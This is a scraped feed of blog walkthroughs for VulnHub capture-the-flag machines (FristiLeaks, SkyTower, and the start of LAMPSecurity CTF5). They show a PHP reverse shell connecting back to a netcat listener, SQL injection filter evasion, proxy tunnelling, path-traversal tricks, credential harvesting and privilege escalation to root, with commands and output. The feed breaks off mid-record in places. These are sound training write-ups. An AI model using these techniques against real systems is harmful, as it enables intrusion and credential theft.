class=\"s2\">ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q</span><span class=\"se\">\\n</span><span class=\"s2\">mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34</span><span class=\"se\">\\n</span><span class=\"s2\">rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe</span><span class=\"se\">\\n</span><span class=\"s2\">EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH</span><span class=\"se\">\\n</span><span class=\"s2\">AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk</span><span class=\"se\">\\n</span><span class=\"s2\">CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR</span><span class=\"se\">\\n</span><span class=\"s2\">U5ErkJggg==\"</span> | <span class=\"nb\">base64</span> <span class=\"nt\">--decode</span> <span class=\"o\">&gt;</span> image.png</code></pre> \n</figure> \n<p>The following credentials were used to login to the web application:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><b>eezeepz</b></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><code>keKkeKKeKKeKkEkkEk</code></p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"php-reverse-shell\">PHP Reverse Shell</h2> \n<p>The file name <code>shell.php.png</code> was used to bypass the web application filtering, the file was still executed as PHP (likely due to incorrectly configured Apache MIME types). A reverse shell successfully connected back to a netcat listener.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# netcat <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443\nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>192.168.221.139] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.150] 34400\nLinux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 <span class=\"c\">#1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>\n 18:26:33 up  5:37,  0 <span class=\"nb\">users</span>,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\n<span class=\"nv\">uid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>48<span class=\"o\">(</span>apache<span class=\"o\">)</span>\nsh: no job control <span class=\"k\">in </span>this shell\nsh-4.1<span class=\"nv\">$ </span><span class=\"nb\">whoami\nwhoami\n</span>apache</code></pre> \n</figure> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>Enumeration of the users home dir found several binary files and the following txt file:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-4.1<span class=\"nv\">$ </span><span class=\"nb\">cat </span>notes\n<span class=\"nb\">cat </span>notes.txt\nYo EZ,\n\nI made it possible <span class=\"k\">for </span>you to <span class=\"k\">do </span>some automated checks,\nbut I did only allow you access to /usr/bin/<span class=\"k\">*</span> system binaries. I did\nhowever copy a few extra often needed commands to my\nhomedir: <span class=\"nb\">chmod</span>, <span class=\"nb\">df</span>, <span class=\"nb\">cat</span>, <span class=\"nb\">echo</span>, ps, <span class=\"nb\">grep</span>, egrep so you can use those\nfrom /home/admin/\n\nDon<span class=\"s1\">'t forget to specify the full path for each binary!\n\nJust put a file called \"runthis\" in /tmp/, each line one command. The\noutput goes to the file \"cronresult\" in /tmp/. It should\nrun every minute with my account privileges.\n\n- Jerry</span></code></pre> \n</figure> \n<p>The following directory traversal (the command had to originate from /usr/bin/) was used to set the permissions for <code>/home/admin</code> <strong>world readable</strong>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"/usr/bin/../../bin/chmod -R 777 /home/admin\"</span> <span class=\"o\">&gt;</span> /tmp/runthis</code></pre> \n</figure> \n<h3 id=\"homeadmin\">/home/admin</h3> \n<p>Inspection of <code>/home/admin</code> disclosed the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-4.1<span class=\"nv\">$ </span><span class=\"nb\">cd</span> /home/admin\n<span class=\"nb\">cd</span> /home/admin\nsh-4.1<span class=\"nv\">$ </span><span class=\"nb\">ls</span> <span class=\"nt\">-la</span>\n<span class=\"nb\">ls</span> <span class=\"nt\">-la</span>\ntotal 652\ndrwxrwxrwx. 2 admin     admin       4096 Nov 19 02:03 <span class=\"nb\">.</span>\ndrwxr-xr-x. 5 root      root        4096 Nov 19 01:40 ..\n<span class=\"nt\">-rwxrwxrwx</span><span class=\"nb\">.</span> 1 admin     admin         18 Sep 22 12:40 .bash_logout\n<span class=\"nt\">-rwxrwxrwx</span><span class=\"nb\">.</span> 1 admin     admin        176 Sep 22 12:40 .bash_profile\n<span class=\"nt\">-rwxrwxrwx</span><span class=\"nb\">.</span> 1 admin     admin        124 Sep 22 12:40 .bashrc\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin      45224 Nov 18 13:42 <span class=\"nb\">cat</span>\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin      48712 Nov 18 14:14 <span class=\"nb\">chmod</span>\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin        737 Nov 18 14:48 cronjob.py\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin         21 Nov 18 15:21 cryptedpass.txt\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin        258 Nov 18 15:20 cryptpass.py\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin      90544 Nov 18 13:49 <span class=\"nb\">df</span>\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin      24136 Nov 18 13:40 <span class=\"nb\">echo</span>\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin     163600 Nov 18 13:42 egrep\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin     163600 Nov 18 13:42 <span class=\"nb\">grep</span>\n<span class=\"nt\">-rwxrwxrwx</span>  1 admin     admin      85304 Nov 18 13:41 ps\n<span class=\"nt\">-rw-r--r--</span>  1 fristigod fristigod     25 Nov 19 01:47 whoisyourgodnow.txt\nsh-4.1<span class=\"nv\">$ </span><span class=\"nb\">cat </span>whoisyourgodnow.txt\n<span class=\"nb\">cat </span>whoisyourgodnow.txt\n<span class=\"o\">=</span>RFn0AKnlMHMPIzpyuTI0ITG\nsh-4.1<span class=\"nv\">$ </span><span class=\"nb\">cat </span>cryptedpass.txt\n<span class=\"nb\">cat </span>cryptedpass.txt\nmVGZ3O3omkJLmy2pcuTq</code></pre> \n</figure> \n<p>The following python script appeared to create the above string in cryptedpass.txt:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">sh</span><span class=\"o\">-</span><span class=\"mf\">4.1</span><span class=\"err\">$</span> <span class=\"n\">cat</span> <span class=\"n\">cryptpass</span><span class=\"p\">.</span><span class=\"n\">py</span>\n<span class=\"n\">cat</span> <span class=\"n\">cryptpass</span><span class=\"p\">.</span><span class=\"n\">py</span>\n<span class=\"c1\">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn\n</span><span class=\"kn\">import</span> <span class=\"nn\">base64</span><span class=\"p\">,</span><span class=\"n\">codecs</span><span class=\"p\">,</span><span class=\"n\">sys</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">encodeString</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">):</span>\n    <span class=\"n\">base64string</span><span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">b64encode</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">codecs</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"n\">base64string</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">],</span> <span class=\"s\">'rot13'</span><span class=\"p\">)</span>\n\n<span class=\"n\">cryptoResult</span><span class=\"o\">=</span><span class=\"n\">encodeString</span><span class=\"p\">(</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">])</span>\n<span class=\"k\">print</span> <span class=\"n\">cryptoResult</span></code></pre> \n</figure> \n<p>The above script was modified on the attacking machine to decode the string:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"c1\">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn\n</span><span class=\"kn\">import</span> <span class=\"nn\">base64</span><span class=\"p\">,</span><span class=\"n\">codecs</span><span class=\"p\">,</span><span class=\"n\">sys</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">encodeString</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">):</span>\n    <span class=\"n\">base64string</span><span class=\"o\">=</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">b64encode</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">codecs</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"n\">base64string</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">],</span> <span class=\"s\">'rot13'</span><span class=\"p\">)</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">decodeString</span><span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">):</span>\n    <span class=\"n\">string</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n    <span class=\"n\">string</span> <span class=\"o\">=</span> <span class=\"n\">string</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">\"rot13\"</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">base64</span><span class=\"p\">.</span><span class=\"n\">b64decode</span><span class=\"p\">(</span><span class=\"n\">string</span><span class=\"p\">)</span>\n\n<span class=\"k\">print</span> <span class=\"n\">decodeString</span><span class=\"p\">(</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">])</span></code></pre> \n</figure> \n<p>String successfully decoded:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# python reverse.py <span class=\"s2\">\"=RFn0AKnlMHMPIzpyuTI0ITG\"</span>\nLetThereBeFristi!</code></pre> \n</figure> \n<p>Using the previously decoded string it was possible to <code>su -</code> to the user <strong>fristigod</strong>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-4.1<span class=\"nv\">$ </span>python <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/sh\")'</span>\npython <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/sh\")'</span>\nsh-4.1<span class=\"nv\">$ </span>su - fristigod\nsu - fristigod\nPassword: LetThereBeFristi!\n\n<span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span><span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>502<span class=\"o\">(</span>fristigod<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>502<span class=\"o\">(</span>fristigod<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>502<span class=\"o\">(</span>fristigod<span class=\"o\">)</span></code></pre> \n</figure> \n<p>Enumeration as the user <strong>fristigod</strong> revealed the SUID binary: <code>/var/fristigod/.secret_admin_stuff/doCom</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span><span class=\"nb\">ls</span> <span class=\"nt\">-la</span> /var/fristigod\n<span class=\"nb\">ls</span> <span class=\"nt\">-la</span> /var/fristigod\ntotal 16\ndrwxr-x---   3 fristigod fristigod 4096 Nov 25 05:55 <span class=\"nb\">.</span>\ndrwxr-xr-x. 19 root      root      4096 Nov 19 01:41 ..\n<span class=\"nt\">-rw-------</span>   1 fristigod fristigod  864 Nov 25 06:09 .bash_history\ndrwxrwxr-x.  2 fristigod fristigod 4096 Nov 25 05:53 .secret_admin_stuff\n<span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span><span class=\"nb\">cd</span> .se\n<span class=\"nb\">cd</span> .secret_admin_stuff/\n<span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span><span class=\"nb\">ls\nls\n</span>doCom\n<span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span><span class=\"nb\">ls</span> <span class=\"nt\">-la</span>\n<span class=\"nb\">ls</span> <span class=\"nt\">-la</span>\ntotal 16\ndrwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 05:53 <span class=\"nb\">.</span>\ndrwxr-x---  3 fristigod fristigod 4096 Nov 25 05:55 ..\n<span class=\"nt\">-rwsr-sr-x</span>  1 root      root      7529 Nov 25 05:53 doCom\n<span class=\"nt\">-bash-4</span>.1<span class=\"nv\">$ </span>./d\n./doCom\nNice try, but wrong user <span class=\"p\">;</span><span class=\"o\">)</span></code></pre> \n</figure> \n<h2 id=\"privilege-escalation\">Privilege Escalation</h2> \n<p>Execution of the doCom binary was possible using the user <strong>fristi</strong> from the logged in user <strong>fristigod</strong>, successfully escalating privileges.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo</span> <span class=\"nt\">-u</span> fristi .secret_admin_stuff/doCom /bin/sh\nsh-4.1# <span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>100<span class=\"o\">(</span><span class=\"nb\">users</span><span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>100<span class=\"o\">(</span><span class=\"nb\">users</span><span class=\"o\">)</span>,502<span class=\"o\">(</span>fristigod<span class=\"o\">)</span></code></pre> \n</figure> \n<h2 id=\"root-flag\">Root Flag</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">cat </span>fristileaks_secrets.txt\nCongratulations on beating FristiLeaks 1.0 by Ar0xA <span class=\"o\">[</span>https://tldr.nu]\n\nI wonder <span class=\"k\">if </span>you beat it <span class=\"k\">in </span>the maximum 4 hours it<span class=\"s1\">'s supposed to take!\n\nFlag: Y0u_kn0w_y0u_l0ve_fr1st1</span></code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Tue, 15 Dec 2015 00:00:00 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/fristileaks/webform.png","linkMd5":"151dc6e26c818b6fbd5ec060100e4fb7","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn46@2020_2/2020/08/25/01-24-54-350_db6ab0e11b09f032.webp","destWidth":1222,"destHeight":810,"sourceBytes":169806,"destBytes":41272,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/fristileaks/webform.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn46@2020_2/2020/08/25/01-24-54-350_db6ab0e11b09f032.webp"},"publishedOrCreatedDate":1598318675548},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"SkyTower - Walkthrough","link":"https://highon.coffee/blog/skytower-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#enumeration\" id=\"markdown-toc-enumeration\">Enumeration</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#host-service-enumeration\" id=\"markdown-toc-host-service-enumeration\">Host Service Enumeration</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#web-application-analysis\" id=\"markdown-toc-web-application-analysis\">Web Application Analysis</a></li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#http-proxy-ssh-connection\" id=\"markdown-toc-http-proxy-ssh-connection\">HTTP Proxy SSH Connection</a></li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#local-enumeration\" id=\"markdown-toc-local-enumeration\">Local Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#mysql-credentials\" id=\"markdown-toc-mysql-credentials\">MySQL Credentials</a></li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#privilege-escalation---password-reuse\" id=\"markdown-toc-privilege-escalation---password-reuse\">Privilege Escalation - Password Reuse</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#getting-root\" id=\"markdown-toc-getting-root\">Getting root:</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/skytower-walkthrough/#conclusion\" id=\"markdown-toc-conclusion\">Conclusion</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the “flag”.</p> \n<p>You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.</p> \n<p><strong>Author:</strong> Telspace Systems</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 10.0.1.114</code></pre> \n</figure> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.22 ((Debian))</p> \n     </pc> </td> \n   </tr> \n   <td> \n    <pc> \n     <p><code>TCP: 3128</code></p> \n    </pc> </td> \n   <td> \n    <pc> \n     <p>http-proxy</p> \n    </pc> </td> \n   <td> \n    <pc> \n     <p>Squid http proxy 3.1.20</p> \n    </pc> </td> &lt;/tr&gt; \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-analysis\">Web Application Analysis</h2> \n<p>The basic test below indicated the web application could be vulnerable to SQL injection.</p> \n<p><img src=\"https://highon.coffee/img/blog/skytower/sqli-test.png\" alt=\"SQLi Test\" /></p> \n<p>SQL Injection looked possible + DB identified as MySQL:</p> \n<p><img src=\"https://highon.coffee/img/blog/skytower/sqli-error.png\" alt=\"MySQL error\" /></p> \n<p>Enumeration indicated the web application was filtering the SQLi attempts and removing some characters, such as <code>OR</code>. This was overcome (after researching for SQLi filtering evasion) using the following:</p> \n<p><img src=\"https://highon.coffee/img/blog/skytower/burp-sqli-evasion.png\" alt=\"Burp SQLi Evasion\" /></p> \n<p>With no direct access to SSH the above credentials could not be leveraged to gain a Shell.</p> \n<h2 id=\"http-proxy-ssh-connection\">HTTP Proxy SSH Connection</h2> \n<p>The following was used to gain access to the SSH server by proxying the connection through the open <strong>SQUID</strong> server on the target machine.</p> \n<p>Setup tunnel with proxytunnel:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# proxytunnel <span class=\"nt\">-p</span> 10.0.1.114:3128 <span class=\"nt\">-d</span> 127.0.0.1:22 <span class=\"nt\">-a</span> 4444</code></pre> \n</figure> \n<p>SSH through the HTTP tunnel:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ssh john@127.0.0.1 <span class=\"nt\">-p</span> 4444  <span class=\"s2\">\"/bin/sh\"</span>\njohn@127.0.0.1<span class=\"s1\">'s password:\n\nid\nuid=1000(john) gid=1000(john) groups=1000(john)</span></code></pre> \n</figure> \n<p><code>/bin/sh</code> needed to be postfixed to the end of the SSH command, as the server appeared to kick connections upon connection.</p> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>Enumeration as the user John discovered the MySQL root credentials:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span><span class=\"nb\">cat </span>login.php\n&lt;?php\n\n<span class=\"nv\">$db</span> <span class=\"o\">=</span> new mysqli<span class=\"o\">(</span><span class=\"s1\">'localhost'</span>, <span class=\"s1\">'root'</span>, <span class=\"s1\">'root'</span>, <span class=\"s1\">'SkyTech'</span><span class=\"o\">)</span><span class=\"p\">;</span></code></pre> \n</figure> \n<h2 id=\"mysql-credentials\">MySQL Credentials</h2> \n<p>The following process was used to disclosed the users credentials:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>mysql <span class=\"nt\">-u</span> root <span class=\"nt\">-p</span>\nEnter password: root\nshow databases<span class=\"p\">;</span>\n\n\n<span class=\"se\">\\q</span>\nDatabase\ninformation_schema\nSkyTech\nmysql\nperformance_schema\n<span class=\"nv\">$ </span>mysql <span class=\"nt\">-u</span> root <span class=\"nt\">-p</span> SkyTech\nEnter password: root\nshow tables<span class=\"p\">;</span>\n<span class=\"se\">\\q</span>\nTables_in_SkyTech\nlogin\n\n\n\nmysql <span class=\"nt\">-u</span> root <span class=\"nt\">-p</span> SkyTech\nEnter password: rootroot\nERROR 1045 <span class=\"o\">(</span>28000<span class=\"o\">)</span>: Access denied <span class=\"k\">for </span>user <span class=\"s1\">'root'</span>@<span class=\"s1\">'localhost'</span> <span class=\"o\">(</span>using password: YES<span class=\"o\">)</span>\nmysql <span class=\"nt\">-u</span> root <span class=\"nt\">-p</span> SkyTech\nEnter password: root\n<span class=\"k\">select</span> <span class=\"k\">*</span> from login<span class=\"p\">;</span>\n<span class=\"se\">\\q</span>\n<span class=\"nb\">id    </span>email    password\n1    john@skytech.com    hereisjohn\n2    sara@skytech.com    ihatethisjob\n3    william@skytech.com    senseable</code></pre> \n</figure> \n<h2 id=\"privilege-escalation---password-reuse\">Privilege Escalation - Password Reuse</h2> \n<p>Password reuse for the user <code>sara</code> was possible using the previously discovered credentials.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# ssh sara@127.0.0.1 <span class=\"nt\">-p</span> 4444 <span class=\"nt\">-t</span>  <span class=\"s2\">\"/bin/sh\"</span>\nsara@127.0.0.1<span class=\"s1\">'s password:\n$ sudo -l\nMatching Defaults entries for sara on this host:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser sara may run the following commands on this host:\n    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*</span></code></pre> \n</figure> \n<p>The user <strong>sara</strong> had sudo access to the binary <code>/bin/cat</code>, path traversal was used to cat the contents of <code>/root/flag.txt</code> which contained the root password.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span><span class=\"nb\">sudo</span> /bin/cat /accounts/../root/flag.txt\nCongratz, have a cold one to celebrate!\nroot password is theskytower\n<span class=\"err\">$</span></code></pre> \n</figure> \n<h3 id=\"getting-root\">Getting root:</h3> \n<p>With the previously discovered credentials it was possible to <code>su -</code> to root:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>su -\nPassword:\nroot@SkyTower:~# <span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\nroot@SkyTower:~# <span class=\"nb\">cat </span>flag.txt\nCongratz, have a cold one to celebrate!\nroot password is theskytower\nroot@SkyTower:~#</code></pre> \n</figure> \n<h2 id=\"conclusion\">Conclusion</h2> \n<p>I enjoyed the SQL injection filtering evasion, overall a short CTF that can easily be done in an evening.</p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Mon, 20 Jul 2015 15:00:59 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/skytower/sqli-test.png","linkMd5":"6b1c95f0f8a6d69f95e2ee923895c3c4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn88@2020_4/2020/08/25/01-24-54-631_3cc2884c57a21723.webp","destWidth":817,"destHeight":752,"sourceBytes":887308,"destBytes":60300,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/skytower/sqli-test.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn88@2020_4/2020/08/25/01-24-54-631_3cc2884c57a21723.webp","https://highon.coffee/img/blog/skytower/sqli-error.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn3@2020_4/2020/08/25/01-25-14-629_d9fe738fb6dc08ab.webp","https://highon.coffee/img/blog/skytower/burp-sqli-evasion.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn23@2020_5/2020/08/25/01-25-14-560_f132bc872f21b509.webp"},"publishedOrCreatedDate":1598318675549},{"createdTime":"2020-08-25 href=\"https://highon.coffee/blog/lamp-security-ctf5-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products.</p> \n<p><strong>Author:</strong> madirish2600</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com/\">VulnHub</a> via <a href=\"https://twitter.com/VulnHub\">@VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.130</code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>Dislcaimer: Multiple Entry Points</h5> \n <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p> \n</div> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 4.7 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 25</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SMTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Sendmail 8.14.1/8.14.1</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <p>ipop3d 2006k.101</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 111</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>rpcbind</p> \n     </pc> </td> \n    <td> \n     <pc> \n      